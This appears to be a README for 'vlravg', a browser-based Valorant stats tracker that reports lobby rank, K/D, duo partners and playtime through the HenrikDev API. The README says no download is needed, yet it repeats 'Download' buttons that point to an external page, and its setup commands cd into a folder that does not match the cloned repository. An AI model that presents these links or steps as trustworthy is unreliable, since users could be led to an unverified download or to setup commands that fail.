# vlravg – Valorant Stats Tracker 2026

> **A browser-based tool that shows your average lobby rank, per-game K/D stats, frequent duo partners, and total playtime in Valorant — using the HenrikDev API for live match data.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganbaker84/vlravg-match-stats?style=flat-square)](https://github.com/loganbaker84/vlravg-match-stats)

---

<p align="center">
  <a href="https://loganbaker84.github.io/vlravg-match-stats/">
    <img src="https://img.shields.io/badge/Download-vlravg%20Latest-brightgreen?style=for-the-badge" alt="Download vlravg">
  </a>
</p>

> **[Direct Download – vlravg](https://loganbaker84.github.io/vlravg-match-stats/)**

---

[Download Latest Build](https://loganbaker84.github.io/vlravg-match-stats/)

---

## What Is vlravg?

vlravg is a lightweight web application for Valorant players who want more than win/loss records. It computes the average rank across all players in each of your matches, breaks down your kill/death ratio game by game, and highlights the teammates you queue with most often. Whether you solo queue or run with friends, this tracker gives you a sharper view of your competitive landscape.

The app pulls live match data through the HenrikDev API, so your stats always reflect your most recent games. No need to dig through raw logs — just enter your Riot ID, and vlravg presents your performance metrics in a clear, easy-to-read layout.

---

## Key Features

- **Average Lobby Rank** – Displays the mean rank of every player in each match, putting your performance in context.
- **K/D Breakdowns** – Shows kill/death ratios per game plus an average across your recent matches.
- **Duos Tracking** – Lists the players you duo with most often and compares your stats when playing together.
- **Playtime Tracking** – Tracks total hours played, session durations, and how often you play over time.
- **Live Data** – Stats refresh automatically from the HenrikDev API after each match.
- **No Installation Needed** – Runs entirely in your browser; nothing to download or configure.
- **Fast and Light** – Minimal dependencies and quick load times for instant stat checks.

---

## Setup

Because vlravg runs in the browser, there is no traditional installation. You can use the hosted version or clone the repository for offline access:

```bash
git clone https://github.com/loganbaker84/vlravg-match-stats.git
cd vlravg
```

Then open `index.html` in any modern browser. No build tools or server required.

---

## How to Use

1. Open the vlravg page in your browser.
2. Enter your full Riot ID (include the tagline, e.g., `Player#NA1`).
3. Click the "Fetch Stats" button.
4. Review your average lobby rank, K/D breakdowns, duo partners, and playtime.

Example workflow:
- After a ranked session, load vlravg to see the average rank of your lobbies and gauge whether you are playing above or below your own rating.
- Check your K/D across the last 10 games to spot trends or slumps.
- Look at your duos list to see which friends you perform best with.

---

## Configuration

All settings are stored in your browser's local storage. There are no configuration files to edit. To reset or clear your data, simply clear your browser cache for the vlravg page.

Advanced users can modify the API endpoint or request parameters inside `script.js` if they have their own HenrikDev API key.

---

## Requirements

- A modern web browser (Chrome, Firefox, Edge, or Safari).
- An active internet connection to fetch match data from the HenrikDev API.
- A valid Valorant Riot ID (including tagline) to look up stats.
- No additional software, plugins, or runtime environments needed.

---

## Frequently Asked Questions

**How do I get support?**  
Open an issue on the GitHub repository and include details about your problem, your browser, and any error messages.

**How often are my stats updated?**  
Stats refresh each time you click "Fetch Stats," pulling the latest available match data from the HenrikDev API.

**Can I use my own API key?**  
Yes. Edit the API key variable in `script.js` to use your own HenrikDev API key. The default key may have rate limits.

**Why don’t I see my most recent match?**  
There may be a short delay between a match ending and the API making it available. Try again after a few minutes.

**Is my data stored anywhere?**  
No. All data is fetched live from the API and displayed in your browser. Nothing is saved on a server.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
